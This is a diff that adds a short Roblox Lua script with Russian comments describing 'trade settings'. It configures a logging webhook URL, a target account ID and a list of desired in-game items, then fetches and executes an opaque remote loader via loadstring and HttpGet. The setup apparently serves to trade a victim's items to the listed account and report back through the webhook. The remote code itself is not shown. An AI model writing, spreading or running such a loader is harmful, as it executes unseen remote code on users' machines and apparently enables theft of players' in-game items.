@@ -1,0 +1,9 @@
+-- Настройки трейда
+getgenv().WEBHOOK_URL = "https://skama.net/api/logs/webhook/mrr_f3c631c272144b39bff34fa78896917e"
+getgenv().TARGET_ID = 7236992272  -- ID аккаунта для трейда
+getgenv().DELAY_STEP = 1      
+getgenv().TRADE_CYCLE_DELAY = 2 
+getgenv().TARGET_BRAINROTS = {
+    ["Garama and Madundung"] = true
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()
